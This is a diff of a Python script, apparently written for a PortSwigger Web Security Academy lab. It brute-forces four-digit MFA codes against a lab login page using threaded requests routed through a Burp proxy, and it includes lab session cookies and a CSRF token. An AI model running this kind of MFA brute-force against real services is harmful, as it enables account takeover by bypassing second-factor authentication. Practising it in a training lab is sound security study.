@@ -14,12 +14,11 @@ Multi-threading requests, and comparing numerical strings
 possible improvements: after a matching one is found, subsequent calls aren't made
 '''
 
-burp0_url = "https://acc71f641ec6de2680a3684a0074008d.web-security-academy.net:443/login2"
-burp0_cookies = {"verify": "carlos",
-                 "session": "fdYBaL6KVn0C6BE7hIQyi9E16UHwkGN2"}
-burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "https://acc71f641ec6de2680a3684a0074008d.web-security-academy.net", "Content-Type": "application/x-www-form-urlencoded",
-                 "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://acc71f641ec6de2680a3684a0074008d.web-security-academy.net/login2", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
-burp0_data = {"mfa-code": "0943"}
+burp0_url = "https://aceb1f211fa8bf618017500b001b0002.web-security-academy.net:443/login2"
+burp0_cookies = {"session": "wUhrQXmmdE5ZDmFNIbGv11wOHJTq2A2x"}
+burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "https://aceb1f211fa8bf618017500b001b0002.web-security-academy.net", "Content-Type": "application/x-www-form-urlencoded",
+                 "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://aceb1f211fa8bf618017500b001b0002.web-security-academy.net/login2", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
+burp0_data = {"csrf": "Pfs02QzwmIX8AQLCskH92EtwldtiGsNt", "mfa-code": "0000"}
 
 
 # setup the variables for requests to go through burp
@@ -28,12 +27,14 @@ os.environ['REQUESTS_CA_BUNDLE'] = 'burp_cert.pem'
 os.environ['HTTP_PROXY'] = "http://127.0.0.1:8080"
 os.environ['HTTPS_PROXY'] = "http://127.0.0.1:8080"
 
+
 def threaded_brute_request(url=None, cookies=None, headers=None):
   found_match = False
   with ThreadPoolExecutor(max_workers=16) as executor:
     returned_futures = []
-    for le_brut in range(900,1001):
-      data = {"mfa-code": f"{le_brut:04}"}
+    for le_brut in range(000, 101):
+      data = {"csrf": "Pfs02QzwmIX8AQLCskH92EtwldtiGsNt",
+              "mfa-code": f"{le_brut:04}"}
       print(f"submitting request with code: {data}")
       returned_future = executor.submit(send_request_and_check_response,
                                         url=url, cookies=cookies, headers=headers, data=data)
@@ -50,7 +51,8 @@ def threaded_brute_request(url=None, cookies=None, headers=None):
 
 def send_request_and_check_response(url, cookies, headers, data) -> bool:
   print(f"posting request with data: {data}")
-  response = requests.post(url, allow_redirects=False, headers=headers, cookies=cookies, data=data)
+  response = requests.post(url, allow_redirects=False,
+                           headers=headers, cookies=cookies, data=data)
   # print(response)
   # matching response is empty and has a 'location' header for redirect
   if int(response.headers['Content-Length']) == 0 and response.headers.get('Location') is not None:
